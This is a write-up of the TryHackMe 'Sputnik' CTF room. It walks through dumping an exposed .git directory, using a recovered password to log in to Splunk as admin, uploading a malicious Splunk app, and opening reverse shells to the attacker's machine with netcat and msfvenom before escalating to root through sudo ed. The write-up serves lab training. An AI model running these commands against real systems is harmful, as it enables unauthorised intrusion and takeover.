Greeting there, today we are going for another tryhackme CTF challenge. This room is ported by user DarkStar7471 from VulnHub. For your information, [the Vulnhub](https://www.vulnhub.com/) is training ground for CTF challenger or a place to sharpen your pentesting skill. This challenge required basic knowledge of the git command and Splunk. If you are new to git, [this article](https://blog.netspi.com/dumping-git-data-from-misconfigured-web-servers/) and [cheat sheet](https://github.github.com/training-kit/downloads/github-git-cheat-sheet.pdf) might help you out. Let's start the walkthrough, shall we?

## Task 1: Capture the flag

Your task is to capture the root flag. That's all.

### Task 1-1: Secret?

First off, we are going to launch the Nmap scanner using the following command.

```
nmap -Pn -p- -A -v <MACHINE IP>
```

![nmap](/assets/images/THM/2020-08-10-sputnik/2.png)

![more nmap](/assets/images/THM/2020-08-10-sputnik/3.png)

There a total of 4 open ports available on the machine which is Port 8089 (HTTPS), 8191 (Mongo dB), 55555 (HTTP), and 61337 (HTTP).

#### 1) Port 8089

![http](/assets/images/THM/2020-08-10-sputnik/4.png)

A Splunk atom feed that required a login credential. Skip it.

#### 2) Port 55555

![flappy](/assets/images/THM/2020-08-10-sputnik/5.png)

Ah, what a lovely raging game. By referring to the Nmap scanner,  there are a .git directory hidden within port 55555.

![git](/assets/images/THM/2020-08-10-sputnik/6.png)

Look like an exposed git directory. Please refer to [this article](https://medium.com/@logicbomb_1/bugbounty-how-i-was-able-to-download-the-source-code-of-indias-largest-telecom-service-52cf5c5640a1) for more information. After that download the git file into your machine using the following command.

```
wget -r http://<Machine IP>:55555/.git
```

We are going to enumerate the entire git folder. Let's check with the stat using **'git status'**.

![enumerate git](/assets/images/THM/2020-08-10-sputnik/7.png)

We got four deleted files. Also, you can check the deleted content using **'git diff'** status

![delete git](/assets/images/THM/2020-08-10-sputnik/8.png)

Nothing out of ordinary at all. Next, check for the hidden files inside the branches using **'git branch'**.

![branch git](/assets/images/THM/2020-08-10-sputnik/9.png)

Nope, nothing inside. We have checked the file status inside the git. How about history? Use **'git log'**.

![git log](/assets/images/THM/2020-08-10-sputnik/10.png)

Well, reading this log entry raise suspicion. We are going to revert back the git to commit id  07fda135aae22fa7869b3de9e450ff7cacfbc717 using **'git reset --hard <id>'** .

![git reset](/assets/images/THM/2020-08-10-sputnik/11.png)

Error? Huh... I guess this git is not originated from this server. Let enumerate what is inside the folder.

![origin](/assets/images/THM/2020-08-10-sputnik/12.png)

Checking the **origin** file inside the  **.git/logs/refs/remotes** give us an idea. This git is originally from https://github.com/ameerpornillos/flappy.git. Without further ado, let's clone the git repo and revert the commit.

![message](/assets/images/THM/2020-08-10-sputnik/13.png)

A secret file leaves us the following message.

```
sputnik:ameer_says_thank_you_and_good_job
```

Let's search for more clue about this file by reverting it to the id where the file getting an update.

![update](/assets/images/THM/2020-08-10-sputnik/14.png)

Wrong info? I guess this file contains a piece of important information. Login credential perhaps? Also, We haven't discovered the port 61337 yet.

### Task 1-2: Capture the root flag

#### 1) Port 61337

![splunk](/assets/images/THM/2020-08-10-sputnik/15.png)

A Splunk server login page eh. Gonna try the credential (user: sputnik, password: ameer_says_thank_you_and_good_job).

![server](/assets/images/THM/2020-08-10-sputnik/16.png)

Oops, we accidentally login into the server and we have admin privilege for the server too. To access to the machine, we need to generate a reverse shell. [This article](https://www.hackingarticles.in/penetration-testing-on-splunk/) providing a full guide on exploiting using the [Splunk shell](http:// https://github.com/TBGSecurity/splunk_shells/archive/1.2.tar.gz 1 https://github.com/TBGSecurity/splunk_shells/archive/1.2.tar.gz), worth a read. First off, download the Splunk shell from this website and **go to search and report**.

![search report](/assets/images/THM/2020-08-10-sputnik/17.png)

At the top bar, click the **App: Search & Reporting** and select **manage Apps**.

![manage apps](/assets/images/THM/2020-08-10-sputnik/18.png)

We are going to **install the app from file** at the top right. Then, upload the tar.gz file we just downloaded.

![install](/assets/images/THM/2020-08-10-sputnik/19.png)

![upload](/assets/images/THM/2020-08-10-sputnik/20.png)

After that, restart the Splunk server.

![restart](/assets/images/THM/2020-08-10-sputnik/21.png)

Login to the server again, we have the apps inside the server.

![apps](/assets/images/THM/2020-08-10-sputnik/22.png)

Then, select the **radio button** to All apps and save it.

![all apps](/assets/images/THM/2020-08-10-sputnik/23.png)

Fire up your Netcat listener in your own machine using the following command

```
nc -lvnp 4444
```

Go back the search & reporting and enter the following command on Splunk search field. Make sure you use your own [tunnel IP](https://tryhackme.com/access).

```
| revshell std <Tunnel IP> 4444
```

![search again](/assets/images/THM/2020-08-10-sputnik/24.png)

![tunnel](/assets/images/THM/2020-08-10-sputnik/25.png)

#### 2) Spawn a TTY shell

![shell](/assets/images/THM/2020-08-10-sputnik/26.png)

Ta-da, we are now inside the victim machine. Time to capture the root's flag. This shell looks a bit 'dirty', how about spawn a shell using the Python?

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

![spawn shell](/assets/images/THM/2020-08-10-sputnik/27.png)

Weird!, we can't spawn a shell using python inside the session. After googling and researching, I come across [this article](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). We are now going to use msfvenom to spawn a shell from a shell, what a 'shellception'. We are going to use port 2222 for the second shell.

```
msfvenom -p cmd/unix/reverse_python LHOST=<Tunnel IP> LPORT=2222 R
```

![msfvenom](/assets/images/THM/2020-08-10-sputnik/28.png)

#### 3) Capture the flag

Launch another Netcat with port 2222 and copy the payload to the first shell.

![more shell](/assets/images/THM/2020-08-10-sputnik/29.png)

We are now able to spawn a TTY shell inside the machine. Let's check what can we do with the sudo command.

![sudo](/assets/images/THM/2020-08-10-sputnik/30.png)

We can run 'ed' command inside the machine using sudo command. Checking the ed command from [GTFObin](https://gtfobins.github.io/gtfobins/ed/) give us an answer.

![ed](/assets/images/THM/2020-08-10-sputnik/31.png)

![root](/assets/images/THM/2020-08-10-sputnik/32.png)

Congratulation, you are now rooted in the machine.Time for the flag.

## Conclusion

That's all for the Sputnik boot2root CTF challenge. Hope you enjoy the walkthrough. until nex time ;)
